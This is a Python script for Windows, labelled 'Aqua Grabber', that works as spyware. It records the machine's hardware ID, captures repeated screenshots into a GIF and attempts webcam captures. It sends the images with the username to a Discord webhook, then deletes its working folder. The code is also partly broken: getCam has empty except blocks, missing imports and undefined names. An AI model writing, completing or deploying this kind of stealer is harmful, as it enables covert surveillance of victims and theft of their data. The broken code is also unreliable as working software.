import os
import shutil

import glob
import subprocess

from PIL import Image
from discord_webhook import DiscordWebhook, DiscordEmbed
from mss import mss

user = os.environ.get("USERNAME")


def get_HWID():
    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    return current_machine_id


def makeDir():
    if not os.path.exists('C:/Users/Public/Aqua'):
        os.mkdir("C:/Users/Public/Aqua")
    if not os.path.exists('C:/Users/Public/Aqua/ss'):
        os.mkdir("C:/Users/Public/Aqua/ss")
    if not os.path.exists('C:/Users/Public/Aqua/Cam'):
        os.mkdir("C:/Users/Public/Aqua/Cam")


def takeSS():
    for i in range(50):
        with mss() as sct:
            sct.shot(mon=-1, output=f"C:/Users/Public/Aqua/ss/{i}.png")
            print(f"Done SS Number {i}")

    frame_folder = f'C:/Users/Public/Aqua/ss'

    def make_gif():
        frames = [Image.open(image) for image in glob.glob(f"{frame_folder}/*")]
        frame_one = frames[0]
        frame_one.save(f"C:/Users/Public/Aqua/ss/SS.gif", format="GIF", append_images=frames,
                       save_all=True, duration=100, loop=1)

    make_gif()
    with open(f'C:/Users/Public/Aqua/ss/SS.gif', 'rb') as f:
        file_data = f.read()
    webhook.content = f'```{user} | ScreenShot | HWID: {get_HWID()}```'
    webhook.add_file(file_data, f'Aqua_{user}_SS.gif')
    print("Done")
    webhook.execute()
    webhook.remove_files()

def getCam():
    try:
        test = 0
        wmi = win32com.client.GetObject("winmgmts:")
        for usb in wmi.InstancesOf("Win32_USBHub"):
            if str(usb.DeviceID).startswith("USB\VID"):
                print(test)
                test = test + 1
            else:
                pass
        for x in range(test):
            try:
                camera = cv2.VideoCapture(x)
                for i in range(1):
                    return_value, image = camera.read()
                    cv2.imwrite(f'C:/Users/Public/Aqua/Cam/{str(x)}.png', image)
                    print(f"Webcam[{x}] Done Pic " + str(i))
                del camera
                webhook.content = f'```{user} | Webcam Number {x} | HWID: {get_id()}```'
                webhook.add_file(file_data, f'Aqua_{user}_Cam_{x}.gif')
                print(f"Done Grabbing Webcam Numb {x}")
                webhook.execute()
                webhook.remove_files()
            except:

    except:



# Clean Up
def cleanUp():
    shutil.rmtree('C:/Users/Public/Aqua')


webhook_url = 'WEBHOOK HERE'
webhook = DiscordWebhook(url=webhook_url)
embed = DiscordEmbed()
webhook.username = "Aqua Grabber"


def runAqua():
    makeDir()
    takeSS()
    cleanUp()


runAqua()
